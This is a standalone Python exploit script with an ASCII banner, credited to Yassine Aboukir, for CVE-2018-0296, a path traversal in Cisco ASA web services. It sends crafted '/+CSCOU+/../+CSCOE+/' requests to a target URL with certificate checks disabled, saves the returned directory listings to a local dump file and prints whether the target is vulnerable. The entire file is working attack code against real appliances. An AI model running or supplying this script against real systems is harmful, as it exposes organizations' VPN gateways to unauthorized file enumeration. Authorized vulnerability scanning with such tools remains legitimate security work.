#!/usr/bin/env python

import requests
import sys
import urlparse
import os

print("""
      _____ _____ _____ _____ _____    ___   _____  ___         
     /  __ \_   _/  ___/  __ \  _  |  / _ \ /  ___|/ _ \        
     | /  \/ | | \ `--.| /  \/ | | | / /_\ \\ `--./ /_\ \       
     | |     | |  `--. \ |   | | | | |  _  | `--. \  _  |       
     | \__/\_| |_/\__/ / \__/\ \_/ / | | | |/\__/ / | | |       
      \____/\___/\____/ \____/\___/  \_| |_/\____/\_| |_/        
                                                                
______     _   _       _____                                  _ 
| ___ \   | | | |     |_   _|                                | |
| |_/ /_ _| |_| |__     | |_ __ __ ___   _____ _ __ ___  __ _| |
|  __/ _` | __| '_ \    | | '__/ _` \ \ / / _ \ '__/ __|/ _` | |
| | | (_| | |_| | | |   | | | | (_| |\ V /  __/ |  \__ \ (_| | |
\_|  \__,_|\__|_| |_|   \_/_|  \__,_| \_/ \___|_|  |___/\__,_|_|
                                                                
 			CVE-2018-0296
 	Script: Yassine Aboukir(@yassineaboukir)
    """)

url = sys.argv[1]
dir_path = os.path.dirname(os.path.realpath(__file__))
filelist_dir = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=/"
CSCOE_dir = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b"
requests.packages.urllib3.disable_warnings()

try:
	filelist_r = requests.get(urlparse.urljoin(url,filelist_dir), verify=False)
	CSCOE_r = requests.get(urlparse.urljoin(url,CSCOE_dir), verify=False)

except requests.exceptions.RequestException as e:
    print e
    sys.exit(1)

if str(filelist_r.status_code) == "200":
	with open("cisco_dump.txt", "a") as cisco_dump:
		cisco_dump.write("\nTarget: {}\n ================\n {}\n ================\n {}".format(url, filelist_r.text, CSCOE_r.text))
	print("Vulnerable! Check the text dump saved in {}".format(dir_path))
else: print("Not vulnerable!")

